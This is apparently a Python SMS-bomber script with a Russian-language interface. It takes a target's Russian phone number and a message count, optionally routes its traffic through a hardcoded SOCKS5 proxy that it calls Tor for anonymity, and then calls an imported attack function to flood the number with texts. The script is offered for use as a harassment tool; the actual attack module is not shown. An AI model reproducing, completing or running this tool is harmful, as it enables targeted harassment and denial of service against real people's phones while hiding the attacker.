import requests
import datetime
import services
from services import banner1an

#colours
green     = '\033[92m'
cyan      = '\033[97m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'

print(':s/+yooy/                ```        ````       `````...                       ``              
      :. `M` `.-/syhhy`        `+mo       .+hNmoys`  .mo:--:d:       oso+///yy.     .dd.            
         .M`     mM/`Nh`        s+m.        -MN -No   m:    .-       o-   .y+       -ods            
         -M`    `mN- sM:       -s`dy `..`   -NN -Nm` .N:`            `  `oo`        y./N- `.`       
         /M.    `Nd  oMh       h- yMo-:/oy- .mN.yMh` /Mo--////         :y-         :y -Nm:-/+y+     
         oM:    .Nh`/dh:      /M+++Nd +h+d/ `dN+-`   +M:             -y+          `dh/+hM:.hoom     
         yM+    :Nh++        .my   hM/  ``  `hd      yM: /dys:     `sh.       .   oM-  -Md  ```     
         yMs    /N- +`       sM/   +Mh`      hy      NM:    .do   /my`     .-++  -Nd   `mM:         
        /NMh`   /d. .y `:++`/mN    `MM-      ho     -MMy+/--+dy :dMMhhdmNMMMMMy -yN+    sMh`        
       -----.   +h`  d/-d+N`  ..   `hMh`   `.do`    `````````  `///:-..````..-/:  `-    :MM:        
               ./+:` +N-.om`        oyy+.  .---.                                        .hys:       
                     `hds:')                                                                         
)

#header
print(f"{green}{bold}\t\t{underline}[Bomber by Trapeza]{end}")

print()
print(f"{bold}Код от{end}", end="")
print(f"{cyan}{bold}Вадика{end}")

print(f"{bold}vk{end}", end = "")
print(f"{green}{bold} : {end}", end = "")
print(f"{cyan}{bold}@lo_se{end}")
print()

#inputs
print('Напишите номер без (8) или с (+7)\nexample: 9018017010')
input_number = input(green + bold + '>> ' + end)
print('Сколько смс отправить?')
sms = int(input(green + bold + '>> ' + end))

print(f"Вам нужна{cyan} анонимность{end}y/n? ")
is_tor = input(bold + green + ">> " + end)


def parse_number(number):
	msg = f"[*]Проверка номера - {green}{bold}OK{end}"
	if int(len(number)) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]Проверка номера - {red}{bold}Ошибка в номере!{end}\nThis bomber is intended only for Russia and if the number you entered belongs to another country then alas this bomber is not suitable for you!")
		quit()
	return number
number = parse_number(input_number)

#tor
if str(is_tor) == "y":
        print(f"[*]launch {cyan}{bold}Tor{end}...")
        proxies = {'http': 'socks5://139.59.53.105:1080','https': 'socks5://139.59.53.105:1080'}
        tor = requests.get('http://icanhazip.com/', proxies=proxies).text
        tor = (tor.replace('\n',''))
        print(f"[*]launch {cyan}{bold}Tor{end} - {green}{bold}OK{end}")

services.attack(number, sms)
